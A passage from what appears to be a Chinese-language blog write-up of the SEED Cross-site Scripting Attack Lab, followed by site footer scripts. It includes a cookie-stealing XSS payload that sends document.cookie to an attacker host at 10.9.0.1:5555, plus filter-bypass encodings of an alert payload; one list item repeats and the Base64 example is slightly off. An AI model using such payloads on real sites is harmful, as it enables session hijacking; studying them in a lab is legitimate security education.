+<p>如果攻击者希望通过 JavaScript 代码将 cookie 发送给自己，可以如下构造js代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;document.write(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span> + escape(document.cookie) + <span class="hljs-string">&#x27;&gt;&#x27;</span>); &lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>当 JavaScript 插入 img 标记时，浏览器尝试从 src 字段中的 URL 加载图像; 这导致向攻击者的机器发送 HTTP GET 请求</p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>XSS攻击可以分为以下几种类型：</p>
+<ol>
+<li>存储型XSS攻击，又称持久型XSS：攻击者将恶意脚本代码存储在Web应用程序的数据库中，当用户访问包含该恶意代码的页面时，恶意代码会被执行。</li>
+<li>反射型XSS攻击，又称非持久型XSS：攻击者将恶意脚本代码作为参数发送给Web应用程序，Web应用程序将该参数反射回给用户，从而执行恶意代码。</li>
+<li>DOM型XSS攻击：攻击者通过修改网页的DOM结构，将恶意脚本代码注入到网页中，从而实现攻击。</li>
+</ol>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ol>
+<li>HTML编码绕过：攻击者通过对恶意脚本代码进行HTML编码，从而绕过应用程序的过滤和验证。</li>
+<li>JavaScript编码绕过：攻击者通过对恶意脚本代码进行JavaScript编码，从而绕过应用程序的过滤和验证。</li>
+<li>DOM型XSS攻击：攻击者通过修改网页的DOM结构，将恶意脚本代码注入到网页中，从而实现攻击。</li>
+</ol>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ol>
+<li>Unicode编码：攻击者通过对恶意脚本代码进行Unicode编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>\u003Cscript\u003Ealert(&#39;XSS&#39;)\u003C/script\u003E</code>。</li>
+<li>Base64编码：攻击者通过对恶意脚本代码进行Base64编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>PHNjcmlwdD5hbGVydCgnWFMnKTwvc2NyaXB0Pg==</code>。</li>
+<li>十六进制编码：攻击者通过对恶意脚本代码进行十六进制编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>。</li>
+<li>双重编码：攻击者通过对恶意脚本代码进行双重HTML编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E</code>。</li>
+<li>十六进制编码：攻击者通过对恶意脚本代码进行十六进制编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>。</li>
+</ol>
+<h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><ul>
+<li>使用HTTPOnly Cookie。HTTPOnly Cookie只能通过HTTP协议传输，无法通过JavaScript等脚本语言访问，从而防止恶意脚本代码访问Cookie。这样，即使恶意脚本代码能够注入到网页中，也无法窃取用户的会话信息</li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/SEED-lab/" class="category-chain-item">SEED-lab</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SEED-lab：Cross-site Scripting Attack Lab</div>
+      <div>http://gls.show/p/53d24de/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>郭佳明</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年10月6日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/p/cb388511/" title="SEED-lab：Cross-Site Request Forgery Attack Lab">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SEED-lab：Cross-Site Request Forgery Attack Lab</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/p/9eb48b8c/" title="SEED-lab：shellshock">
+                        <span class="hidden-mobile">SEED-lab：shellshock</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'LaPhilosophie/gls.show');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
+</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP备2021035969号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        MathJax = {
+          tex    : {
+            inlineMath: { '[+]': [['$', '$']] }
+          },
+          loader : {
+            load: ['ui/lazy']
+          },
+          options: {
+            renderActions: {
+              findScript    : [10, doc => {
+                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                  const display = !!node.type.match(/; *mode=display/);
+                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                  const text = document.createTextNode('');
+                  node.parentNode.replaceChild(text, node);
+                  math.start = { node: text, delim: '', n: 0 };
+                  math.end = { node: text, delim: '', n: 0 };
+                  doc.math.push(math);
+                });
+              }, '', false],
+              insertedScript: [200, () => {
+                document.querySelectorAll('mjx-container').forEach(node => {
+                  let target = node.parentNode;
+                  if (target.nodeName.toLowerCase() === 'li') {
+                    target.parentNode.classList.add('has-jax');
+                  }
+                });
+              }, '', false]
+            }
+          }
+        };
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
